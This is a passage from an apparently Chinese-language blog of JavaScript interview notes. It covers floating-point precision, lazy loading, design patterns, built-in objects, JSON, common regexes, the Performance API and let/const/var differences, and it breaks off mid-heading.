规范中，语句结尾的分号并不是必需的。但是我们一般最好不要省略分号，因为加上分号一方面有利于我们代码的可维护性，另一方面也可以避免我们在对代码进行压缩时出现错误。</p><h2 id="如何编写高性能的-Javascript-？"><a href="#如何编写高性能的-Javascript-？" class="headerlink" title="如何编写高性能的 Javascript ？"></a>如何编写高性能的 Javascript ？</h2><ul><li>使用位运算代替一些简单的四则运算。</li><li>避免使用过深的嵌套循环。</li><li>不要使用未定义的变量。</li><li>当需要多次访问数组长度时，用变量保存起来，避免每次都去进行属性查找。</li></ul><h2 id="为什么-0-1-0-2-0-3？如何解决？"><a href="#为什么-0-1-0-2-0-3？如何解决？" class="headerlink" title="为什么 0.1 + 0.2 != 0.3？如何解决？"></a>为什么 0.1 + 0.2 != 0.3？如何解决？</h2><p>具体见 <a href="https://draveness.me/whys-the-design-floating-point-arithmetic/">《为什么 0.1 + 0.2 = 0.300000004 · Why’s THE Design?》</a></p><ul><li><p>计算机实际上计算的是这两个数字在计算机里所存储的二进制，0.1 和 0.2 在转换为二进制表示的时候会出现位数无限循环的情况。0.1 在二进制中表示为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (0011) 表示循环</span></span><br><span class="line"><span class="number">0.1</span> = <span class="number">2</span>^-<span class="number">4</span> * <span class="number">1.10011</span>(<span class="number">0011</span>)</span><br></pre></td></tr></table></figure></li><li><p>JS 采用的浮点数标准会裁剪掉数字：js 中是以 64 位双精度格式来存储数字的，只有 53 位的有效数字，超过这个长度的位数会被截取掉。IEEE 754 双精度版本（64位）将 64 位分为了三段</p><ul><li>第一位用来表示符号</li><li>接下去的 11 位用来表示指数</li><li>其他的位数用来表示有效位，也就是用二进制表示 0.1 中的 <code>10011(0011)</code></li></ul></li><li><p>这些循环的数字被裁剪就会出现精度丢失的问题，0.1 变成了 <code>0.100000000000000002</code>，同样0.2 变成了 <code>0.200000000000000002</code>。</p></li><li><p>所以这两者相加变成 <code>0.300000000000000004</code></p></li></ul><p>对于这样的情况，我们可以</p><ul><li>将其转换为整数后再进行运算，运算后再转换为对应的小数。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>((<span class="number">0.1</span> + <span class="number">0.2</span>).toFixed(<span class="number">10</span>)) === <span class="number">0.3</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>将两个数相加的结果和右边相减，如果相减的结果小于一个极小数（JavaScript 提供的最小精度值），那么就可以认定结果是相等的。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( <span class="built_in">Math</span>.abs(<span class="number">0.1</span> + <span class="number">0.2</span> - <span class="number">0.3</span>) &lt;= <span class="built_in">Number</span>.EPSILON);</span><br></pre></td></tr></table></figure><h3 id="js-中整数的安全范围是多少？"><a href="#js-中整数的安全范围是多少？" class="headerlink" title="js 中整数的安全范围是多少？"></a>js 中整数的安全范围是多少？</h3><p>安全整数指在这个范围内的整数转化为二进制存储的时候不会出现精度丢失，能够被“安全”呈现的最大整数是 2^53 - 1。在 ES6 中被定义为 Number.MAX_SAFE_INTEGER。最小整数为Number.MIN_SAFE_INTEGER。</p><p>如果某次计算的结果得到了一个超过 JavaScript 数值范围的值，那么这个值会被自动转换为特殊的 Infinity 值。如果某次计算返回了正或负的 Infinity 值，那么该值将无法参与下一次的计算。判断一个数是不是有穷的，可以使用 isFinite 函数来判断。</p><h2 id="懒加载"><a href="#懒加载" class="headerlink" title="懒加载"></a>懒加载</h2><p>定义：也叫<strong>延迟加载</strong>，指的是在长网页中延迟加载图像，是一种很好优化网页性能的方式。在比较长的网页或应用中，如果图片很多，所有的图片都被加载出来，而用户只能看到可视窗口的那一部分图片数据，这样就浪费了性能。</p><p><strong>优点：</strong></p><ul><li>提升用户的体验</li><li>减少无效资源的加载，从而减少了服务器的压力和流量，同时也减小了浏览器的负担。</li><li>防止并发加载的资源过多阻塞 js 的加载</li></ul><h3 id="懒加载原理"><a href="#懒加载原理" class="headerlink" title="懒加载原理"></a>懒加载原理</h3><p>图片的加载是由<code>src</code>引起的，当对<code>src</code>赋值时，浏览器就会请求图片资源。</p><p>原理：首先将页面上的图片的 src 属性设为空字符串，而图片的真实路径则设置在data-original属性（data-xxx 属性是 HTML5 中的新属性）中， 当页面滚动时监听 scroll 事件，在事件回调中判断懒加载的图片是否进入可视区域，如果是则将图片的 src 属性设置为 data-original 的值，实现延迟加载。</p><p>实现：可以参考<a href="https://juejin.cn/post/6844903614138286094">https://juejin.cn/post/6844903614138286094</a></p><h3 id="实现懒加载"><a href="#实现懒加载" class="headerlink" title="实现懒加载"></a>实现懒加载</h3><p>使用原生JavaScript实现懒加载：</p><p><strong>知识点：</strong></p><p>（1）<code>window.innerHeight</code> 是浏览器可视区的高度</p><p>（2）<code>document.body.scrollTop || document.documentElement.scrollTop</code> 是浏览器滚动过的距离</p><p>（3）<code>imgs.offsetTop</code> 是元素顶部距离文档顶部的高度（包括滚动条的距离）</p><p>（4）图片加载条件：<code>img.offsetTop &lt; window.innerHeight + document.body.scrollTop;</code></p><p><img src="https://s2.loli.net/2021/12/05/GxulMWehgsHBfyk.png" alt="image.png"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;loading.gif&quot;</span>  <span class="attr">data-src</span>=<span class="string">&quot;pic.png&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;loading.gif&quot;</span>  <span class="attr">data-src</span>=<span class="string">&quot;pic.png&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;loading.gif&quot;</span>  <span class="attr">data-src</span>=<span class="string">&quot;pic.png&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> imgs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;img&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">lozyLoad</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.body.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> winHeight= <span class="built_in">window</span>.innerHeight;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt; imgs.length;i++)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(imgs[i].offsetTop &lt; scrollTop + winHeight )&#123;</span></span><br><span class="line"><span class="javascript">imgs[i].src = imgs[i].getAttribute(<span class="string">&#x27;data-src&#x27;</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onscroll = lozyLoad();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图片预加载"><a href="#图片预加载" class="headerlink" title="图片预加载"></a>图片预加载</h3><p>定义：将所需资源<strong>提前</strong>请求加载到本地，这样在需要用到时就直接从缓存取。</p><p>优点：提供给用户更好的体验，减少等待的时间。</p><p>方法：</p><ul><li><p>使用HTML标签：<code>&lt;img src=&quot;xxx&quot; style=&quot;display:none&quot;/&gt;</code></p></li><li><p>使用Image对象：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;./myPreload.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myPreload.js文件</span></span><br><span class="line"><span class="keyword">var</span> image= <span class="keyword">new</span> Image()</span><br><span class="line">image.src=<span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>懒加载与预加载的区别:</strong></p><p>一个是提前加载，一个是迟缓甚至不加载。</p><p>懒加载对服务器前端有一定的缓解压力作用，预加载则会增加服务器前端压力。</p><h2 id="JavaScript-设计模式（todo）"><a href="#JavaScript-设计模式（todo）" class="headerlink" title="JavaScript 设计模式（todo）"></a>JavaScript 设计模式（todo）</h2><h3 id="了解哪些设计模式？"><a href="#了解哪些设计模式？" class="headerlink" title="了解哪些设计模式？"></a>了解哪些设计模式？</h3><p><a href="https://juejin.cn/post/6844903469397049352%E3%80%81https://juejin.cn/post/6844904032826294286">https://juejin.cn/post/6844903469397049352、https://juejin.cn/post/6844904032826294286</a></p><p><strong>1、单例模式</strong>：保证了全局只有一个实例来被访问。比如常用的弹框组件的实现和全局状态的实现；针对全局仅需一个对象的场景，如线程池、全局缓存、window 对象等。</p><p><strong>模式特点：</strong></p><ol><li>类只有一个实例</li><li>全局可访问该实例</li><li>自行实例化（主动实例化）</li><li>可推迟初始化，即延迟执行（与静态类/对象的区别）</li></ol><p><strong>2、策略模式：</strong>将方法的实现和方法的调用分离开，外部通过不同的参数可以调用不同的策略。我主要在 MVP 模式解耦的时候用来将视图层的方法定义和方法调用分离。</p><p><strong>3、代理模式：</strong>为一个对象提供一个代用品或占位符，以便控制对它的访问。比如说常见的事件代理。</p><p><strong>4、中介者模式：</strong>多个对象通过一个中介者进行交流，而不是直接进行交流，这样能够将通信的各个对象解耦。</p><p><strong>5、适配器模式：</strong>用来解决两个接口不兼容的情况，不需要改变已有的接口，通过包装一层的方式实现两个接口的正常协作。假如我们需要一种新的接口返回方式，但是老的接口由于在太多地方已经使用了，不能随意更改，这个时候就可以使用适配器模式。比如我们需要一种自定义的时间返回格式，但是我们又不能对 js 时间格式化的接口进行修改，这个时候就可以使用适配器模式。</p><p><strong>6、装饰器模式：</strong><a href="https://segmentfault.com/a/1190000015970099">https://segmentfault.com/a/1190000015970099</a></p><h3 id="说说你对策略模式的理解？JS怎么实现？（todo）"><a href="#说说你对策略模式的理解？JS怎么实现？（todo）" class="headerlink" title="说说你对策略模式的理解？JS怎么实现？（todo）"></a>说说你对策略模式的理解？JS怎么实现？（todo）</h3><h3 id="观察者模式和发布订阅模式有什么不同？"><a href="#观察者模式和发布订阅模式有什么不同？" class="headerlink" title="观察者模式和发布订阅模式有什么不同？"></a>观察者模式和发布订阅模式有什么不同？</h3><p>发布订阅模式其实属于广义上的观察者模式</p><p>在观察者模式中，观察者需要直接订阅目标事件。在目标发出内容改变的事件后，直接接收事件并作出响应。</p><p>在发布订阅模式中，发布者和订阅者之间多了一个<strong>调度中心</strong>。调度中心一方面从发布者接收事件，另一方面向订阅者发布事件，订阅者需要在调度中心中订阅事件。通过调度中心实现了发布者和订阅者关系的解耦。使用发布订阅者模式更利于我们代码的可维护性。</p><h3 id="在开发中都用了哪些设计模式？作用？"><a href="#在开发中都用了哪些设计模式？作用？" class="headerlink" title="在开发中都用了哪些设计模式？作用？"></a><strong>在开发中都用了哪些设计模式？作用？</strong></h3><ul><li>singleton：单例模式，用来减少重复创建对象。</li><li>factory：工厂模式，用来解耦。</li><li>iterator：迭代器模式，用来遍历对象。</li><li>observer：观察者模式，用来收发消息。</li><li>templete：模板模式，用来避免执行相同的操作。</li><li>strategy：策略模式，用来定义算法等。.</li></ul><h3 id="常用算法？（todo）"><a href="#常用算法？（todo）" class="headerlink" title="常用算法？（todo）"></a>常用算法？（todo）</h3><h2 id="常用的调试方法有哪些？"><a href="#常用的调试方法有哪些？" class="headerlink" title="常用的调试方法有哪些？"></a>常用的调试方法有哪些？</h2><ol><li><p>console.log()。如果有一个复杂的对象，直观看起来不怎么方便时，可以用 console.table() 进行展示。</p></li><li><p>打断点。</p></li><li><p>debugger。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (thisThing) &#123;<span class="comment">// 这个thisThing可以写你自己的判断条件,</span></span><br><span class="line">    <span class="keyword">debugger</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取函数的堆栈跟踪。</p></li></ol><h2 id="JavaScript-有哪些内置对象？"><a href="#JavaScript-有哪些内置对象？" class="headerlink" title="*JavaScript 有哪些内置对象？"></a>*JavaScript 有哪些内置对象？</h2><p>全局的对象（ global objects ）或称标准内置对象，不要和 “全局对象（global object）” 混淆。<strong>全局的对象指在全局作用域里的对象</strong>。全局作用域中的其他对象可以由用户的脚本创建或由宿主程序提供。</p><p>标准内置对象的分类：</p><p>（1）<strong>值属性</strong>，这些全局属性返回一个简单值，这些值没有自己的属性和方法。例如 Infinity、NaN、undefined、null 字面量</p><p>（2）<strong>函数属性</strong>，全局函数可以直接调用，不需要在调用时指定所属对象，执行结束后会将结果直接返回给调用者。例如 eval()、parseFloat()、parseInt() 等</p><p>（3）<strong>基本对象</strong>，基本对象是定义或使用其他对象的基础。基本对象包括一般对象、函数对象和错误对象。例如 Object、Function、Boolean、Symbol、Error 等</p><p>（4）<strong>数字和日期对象</strong>，用来表示数字、日期和执行数学计算的对象。例如 Number、Math、Date</p><p>（5）<strong>字符串</strong>，用来表示和操作字符串的对象。例如 String、RegExp</p><p>（6）<strong>可索引的集合对象</strong>，这些对象表示按照索引值来排序的数据集合，包括数组和类型数组，以及类数组结构的对象。例如 Array</p><p>（7）<strong>使用键的集合对象</strong>，这些集合对象在存储数据时会使用到键，支持按照插入顺序来迭代元素。例如 Map、Set、WeakMap、WeakSet</p><p>（8）<strong>矢量集合</strong>，SIMD 矢量集合中的数据会被组织为一个数据序列。例如 SIMD 等</p><p>（9）<strong>结构化数据</strong>，这些对象用来表示和操作结构化的缓冲区数据，或使用 JSON 编码的数据。例如 JSON 等</p><p>（10）<strong>控制抽象对象</strong>。例如 Promise、Generator 等</p><p>（11）<strong>反射</strong>。例如 Reflect、Proxy</p><h2 id="JavaScript-的全局函数有哪些？"><a href="#JavaScript-的全局函数有哪些？" class="headerlink" title="*JavaScript 的全局函数有哪些？"></a>*JavaScript 的全局函数有哪些？</h2><p>全局函数指的是 ECMAScript 中定义的 global 方法。</p><p>编码相关：</p><p>  escape()、unescape()、encodeURI()、decodeURI()、</p><p>  encodeURIComponent()、decodeURIComponent()</p><p>数据处理：</p><p>  Number()、String()</p><p>数字相关：</p><p>  isFinite()、isNaN()、parseFloat()、parseInt()</p><p>特殊：</p><p>  eval()</p><h2 id="操作符的作用？"><a href="#操作符的作用？" class="headerlink" title="*~ 操作符的作用？"></a>*~ 操作符的作用？</h2><p>反转被操作数的位：~ 返回 2 的补码，并且 ~ 会将数字转换为 32 位整数，因此可以使用 ~ 来进行取整操作。~x 大致等同于 -(x+1)。</p><h2 id="eval-是做什么的？"><a href="#eval-是做什么的？" class="headerlink" title="*eval 是做什么的？"></a>*eval 是做什么的？</h2><p>把对应的字符串解析成 JS 代码并运行。</p><p>应该避免使用 eval，不安全，非常耗性能（2次，一次解析成 js 语句，一次执行）。</p><h2 id="内部属性-Class-是什么？"><a href="#内部属性-Class-是什么？" class="headerlink" title="*内部属性 [[Class]] 是什么？"></a>*内部属性 [[Class]] 是什么？</h2><p>所有 typeof 返回值为 “object” 的对象（如数组）都包含一个内部属性 [[Class]]。这个属性无法直接访问，一般通过 <code>Object.prototype.toString(..)</code> 来查看。例如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call( [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] );</span><br><span class="line"><span class="comment">// &quot;[object Array]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call( <span class="regexp">/regex-literal/i</span> );</span><br><span class="line"><span class="comment">// &quot;[object RegExp]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自己创建的类就不会有这份特殊待遇，因为 toString() 找不到 toStringTag 属性时只好返回默认的 Object 标签</span></span><br><span class="line"><span class="comment">// 默认情况类的[[Class]]返回[object Object]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class1</span> </span>&#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> Class1()); <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"><span class="comment">// 需要定制[[Class]]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class2</span> </span>&#123;</span><br><span class="line">  get [<span class="built_in">Symbol</span>.toStringTag]() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Class2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> Class2()); <span class="comment">// &quot;[object Class2]&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Object-assign"><a href="#Object-assign" class="headerlink" title="*Object.assign()"></a>*Object.assign()</h2><p>Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象，返回目标对象。</p><h2 id="尾调用，好处？"><a href="#尾调用，好处？" class="headerlink" title="*尾调用，好处？"></a>*尾调用，好处？</h2><p>尾调用：函数的最后一步调用另一个函数。</p><p>代码执行是基于执行栈的，所以在一个函数里调用另一个函数时，会保留当前的执行上下文，然后再新建另外一个执行上下文加入栈中。如果使用尾调用，因为已经是函数的最后一步，所以<strong>不必再保留当前的执行上下文，从而节省内存</strong>，这就是尾调用优化。但是 ES6 的尾调用优化只在严格模式下开启。</p><h2 id="Symbol-类型的注意点？"><a href="#Symbol-类型的注意点？" class="headerlink" title="*Symbol 类型的注意点？"></a>*Symbol 类型的注意点？</h2><ul><li>Symbol 函数前<strong>不能使用 new 命令</strong>，否则会报错。</li><li>Symbol 函数可以接受<strong>一个字符串作为参数</strong>，表示对 Symbol 实例的描述，主要是为了在控制台显示或者转为字符串时容易区分。</li><li>Symbol 作为属性名，该属性不会出现在 for…in、for…of 循环中，也不会被 Object.keys()、Object.getOwnPropertyNames()、JSON.stringify() 返回。</li><li>Object.getOwnPropertySymbols 方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。</li><li>Symbol.for 接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有就返回这个 Symbol 值，否则新建并返回一个以该字符串为名称的 Symbol 值。</li><li>Symbol.keyFor 方法返回一个已登记的 Symbol 类型值的 key。</li></ul><h2 id="对于-JSON-的了解？"><a href="#对于-JSON-的了解？" class="headerlink" title="*对于 JSON 的了解？"></a>*对于 JSON 的了解？</h2><p>JSON 是一种基于文本的轻量级的数据交换格式，可以被任何的编程语言读取和作为数据格式来传递。在项目开发中，前端通过将一个符合 JSON 格式的数据结构序列化为 JSON 字符串，然后传递到后端。后端通过 JSON 格式的字符串解析后生成对应的数据结构，以此实现前后端数据的传递。</p><p>JSON 和 js 中的对象不是一回事，JSON 中对象格式更加严格，比如说在 JSON 中属性值不能为函数，不能出现 NaN 这样的属性值等，因此大多数的 js 对象是不符合 JSON 对象的格式的。</p><p><code>JSON.stringify()</code>：通过传入一个符合 JSON 格式的数据结构，将其转换为一个 JSON 字符串。如果传入的数据结构不符合 JSON 格式，那么在序列化的时候会对这些值进行对应的特殊处理，使其符合规范。在前端向后端发送数据时，可以调用这个函数将数据对象转化为 JSON 格式的字符串。</p><p> <code>JSON.parse()</code> ：将 JSON 格式的字符串转换为一个 js 数据结构，如果传入的字符串不是标准的 JSON 格式的字符串的话，将会抛出错误。当从后端接收到 JSON 格式的字符串时，可以通过这个方法来将其解析为一个 js 数据结构，以此来进行数据的访问。</p><h2 id="NOSCRIPT-标签是做什么用的？"><a href="#NOSCRIPT-标签是做什么用的？" class="headerlink" title="*NOSCRIPT 标签是做什么用的？"></a>*NOSCRIPT 标签是做什么用的？</h2><p>用来定义在脚本未被执行时的替代内容，也可以用在检测浏览器是否支持脚本，若不支持脚本则可以显示 NOSCRIPT 标签里的 innerText 。</p><h2 id="和-amp-amp-操作符的返回值？"><a href="#和-amp-amp-操作符的返回值？" class="headerlink" title="*|| 和 &amp;&amp; 操作符的返回值？"></a>*|| 和 &amp;&amp; 操作符的返回值？</h2><p>|| 和 &amp;&amp; 首先会对第一个操作数执行条件判断，如果其不是布尔值就先进行 ToBoolean 强制类型转换，然后再执行条件判断。</p><p>对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。</p><p>&amp;&amp; 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。</p><p>|| 和 &amp;&amp; 返回它们其中一个<strong>操作数的值</strong>，而非条件判断的结果。</p><h2 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="*常用正则表达式"></a>*常用正则表达式</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// （1）匹配 16 进制颜色值</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/#([0-9a-fA-F]&#123;6&#125;|[0-9a-fA-F]&#123;3&#125;)/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// （2）匹配日期，如 yyyy-mm-dd 格式</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// （3）匹配 qq 号</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[1-9][0-9]&#123;4,10&#125;$/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// （4）手机号码正则</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^1[34578]\d&#123;9&#125;$/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// （5）用户名正则</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[a-zA-Z\$][a-zA-Z0-9_\$]&#123;4,16&#125;$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字字母下划线组成的字符串</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^\w+$/</span> || <span class="regexp">/^\w&#123;3,20&#125;/</span>;</span><br></pre></td></tr></table></figure><h2 id="的长度？"><a href="#的长度？" class="headerlink" title="*[,,,] 的长度？"></a>*[,,,] 的长度？</h2><p>尾后逗号 （终止逗号）在向 JavaScript 代码添加元素、参数、属性时十分有用。如果想要添加新的属性，并且上一行已经使用了尾后逗号，你可以仅仅添加新的一行，而不需要修改上一行。这使得版本控制更加清晰，以及代码维护麻烦更少。</p><p>如果使用了多于一个尾后逗号，会产生间隙。 带有间隙的数组叫做稀疏数组（密致数组没有间隙），长度为<strong>逗号的数量</strong>。</p><h2 id="Unicode-和-UTF-8-之间的关系？"><a href="#Unicode-和-UTF-8-之间的关系？" class="headerlink" title="*Unicode 和 UTF-8 之间的关系？"></a>*Unicode 和 UTF-8 之间的关系？</h2><p>Unicode 是一种字符集合，可容纳 100 多万个字符。每个字符对应一个不同的 Unicode 编码，它只规定了符号的二进制代码，却没有规定这个二进制代码在计算机中如何编码传输。</p><p>UTF-8 是一种对 Unicode 的编码方式，它是一种变长的编码方式，可以用 1~4 个字节来表示一个字符。</p><h2 id="Reflect-对象创建目的？"><a href="#Reflect-对象创建目的？" class="headerlink" title="*Reflect 对象创建目的？"></a>*Reflect 对象创建目的？</h2><ul><li>将 Object 对象的一些明显属于语言内部的方法（比如 Object.defineProperty，放到 Reflect 对象上。</li><li>修改某些 Object 方法的返回结果，让其变得更合理。</li><li>让 Object 操作都变成函数行为。</li><li>Reflect 对象的方法与 Proxy 对象的方法一一对应，只要是 Proxy 对象的方法，就能在 Reflect 对象上找到对应的方法。这就让 Proxy 对象可以方便地调用对应的 Reflect 方法，完成默认行为，作为修改行为的基础。也就是说，不管 Proxy 怎么修改默认行为，你总可以在 Reflect 上获取默认行为。</li></ul><h2 id="开发中常用的几种-Content-Type-？"><a href="#开发中常用的几种-Content-Type-？" class="headerlink" title="*开发中常用的几种 Content-Type ？"></a>*开发中常用的几种 Content-Type ？</h2><p>（1）application/x-www-form-urlencoded</p><p>浏览器的原生 form 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。该种方式提交的数据放在 body 里面，数据按照 key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL转码。</p><p>（2）multipart/form-data</p><p>该种方式也是一个常见的 POST 提交方式，通常表单上传文件时使用该种方式。</p><p>（3）application/json</p><p>告诉服务器消息主体是序列化后的 JSON 字符串。</p><p>（4）text/xml</p><p>该种方式主要用来提交 XML 格式的数据。</p><h2 id="如何确定页面的可用性时间，什么是-Performance-API？"><a href="#如何确定页面的可用性时间，什么是-Performance-API？" class="headerlink" title="*如何确定页面的可用性时间，什么是 Performance API？"></a>*如何确定页面的可用性时间，什么是 Performance API？</h2><p>Performance API 用于精确度量、控制、增强浏览器的性能表现。这个 API 为测量网站性能，提供以前没有办法做到的精度。</p><p>使用 getTime 来计算脚本耗时的缺点，首先，getTime方法（以及 Date 对象的其他方法）都只能精确到毫秒级别，想要得到更小的时间差别就无能为力了。其次，这种写法只能获取代码运行过程中的时间进度，无法知道一些后台事件的时间进度，比如浏览器用了多少时间从服务器加载网页。</p><p>为了解决这两个不足之处，ECMAScript 5引入“高精度时间戳”这个 API，部署在 performance 对象上。它的精度可以达到1毫秒的千分之一。</p><p>navigationStart：当前浏览器窗口的前一个网页关闭，发生 unload 事件时的 Unix 毫秒时间戳。如果没有前一个网页，则等于 fetchStart 属性。</p><p>loadEventEnd：返回当前网页 load 事件的回调函数运行结束时的 Unix 毫秒时间戳。如果该事件还没有发生，返回 0。</p><p>根据上面这些属性，可以计算出网页加载各个阶段的耗时。比如，网页加载整个过程的耗时的计算方法如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = performance.timing;</span><br><span class="line"><span class="keyword">var</span> pageLoadTime = t.loadEventEnd - t.navigationStart;</span><br></pre></td></tr></table></figure><h2 id="js-中倒计时的纠偏实现？"><a href="#js-中倒计时的纠偏实现？" class="headerlink" title="*js 中倒计时的纠偏实现？"></a>*js 中倒计时的纠偏实现？</h2><p>在前端实现中我们一般通过 setTimeout 和 setInterval 方法来实现一个倒计时效果。但是使用这些方法会存在时间偏差的问题，这是由于 js 的程序执行机制造成的，setTimeout 和 setInterval 的作用是隔一段时间将回调事件加入到事件队列中，因此事件并不是立即执行的，它会<strong>等到当前执行栈为空的时候再取出事件执行</strong>，因此事件等待执行的时间就是造成误差的原因。</p><p>一般解决倒计时中的误差的有这样两种办法：</p><p>（1）第一种是通过前端定时向服务器发送请求获取最新的时间差，以此来校准倒计时时间。</p><p>（2）第二种方法是前端根据偏差时间来自动调整间隔时间的方式来实现的。这一种方式首先是以 setTimeout 递归的方式来实现倒计时，然后通过一个变量来记录已经倒计时的秒数。每一次函数调用的时候，首先将变量加一，然后根据这个变量和每次的间隔时间，我们就可以计算出此时无偏差时应该显示的时间。然后将当前的真实时间与这个时间相减，这样我们就可以得到时间的偏差大小，因此我们在设置下一个定时器的间隔大小的时候，我们就从间隔时间中减去这个偏差大小，以此来实现由于程序执行所造成的时间误差的纠正。</p><h1 id="JavaScript-区别"><a href="#JavaScript-区别" class="headerlink" title="JavaScript 区别"></a>JavaScript 区别</h1><h2 id="let，const，var-区别？（高频）"><a href="#let，const，var-区别？（高频）" class="headerlink" title="let，const，var 区别？（高频）"></a>let，const，var 区别？（高频）</h2><ul><li>var 声明变量可以重复声明，而 let、const 不可以重复声明。</li><li>var 不受限于块级作用域，而 let、const 受限。</li><li>var 可以在声明的上面访问变量（变量提升），而 let、const 有暂时性死区，在声明前访问变量会报错。（注意：<strong>暂时性死区只会在块级作用域中出现</strong>，全局作用域没有）</li><li>var 会与 window 相映射（会挂一个属性），而 let、const 不与 window 相映射。</li><li>const 声明之后必须赋值，否则会报错。</li><li>const 定义不可变的量，改变了就会报错。(若为引用类型，只保证指针固定不变)</li></ul><h3 id="暂时性死区原因？"><a href="#暂时性死区原因？" class="headerlink" title="暂时性死区原因？"></a>暂时性死区原因？</h3><p>ES6新增的let、const关键字声明的变量会产生块级作用域，如果变量在当前作用域中被创建之前被创建出来，由于此时还未完成语法绑定，如果我们访问或使用该变量，就会产生暂时性死区的问题。</p><p>因此从变量的创建到语法绑定之间这一段空间课理解为‘暂时性死区’。</p><h2 id="箭头函数和普通函数的区别（高频）"><a href="#箭头函数和普通函数的区别（高频）" class="headerlink" title="箭头函数和普通函数的区别（高频）"></a>箭头函数和普通函数的区别（高频）</h2><p>具体见 <a href="https://juejin.cn/post/6844903805960585224">https://juejin.cn/post/6844903805960585224</a></p><ol><li>语法更加简洁、清晰：<ul><li>如果没有参数，直接写一个空括号即可</li><li>如果只有一个参数，可以省去参数的括号</li><li>如果函数体的返回值只有一句，可以省略大括号</li></ul></li><li>箭头函数不会创建自己的 <strong>this</strong>，且 this 指向永远不变</li><li>箭头函数没有<strong>原型</strong> prototype，也没有自己的 <strong>arguments</strong>参数（在箭头函数中访问 arguments 实际上获得的是外层执行环境中的值。因此可以在箭头函数中使用 rest 参数代替 arguments 对象，来访问箭头函数的参数列表），因此不能作为<strong>构造函数</strong>使用。（不能 New）</li><li>箭头函数不能用作 <strong>Generator</strong> 函数，不能使用 yeild 关键字</li></ol><h2 id="document-ready-和-window-onload-的区别？"><a href="#document-ready-和-window-onload-的区别？" 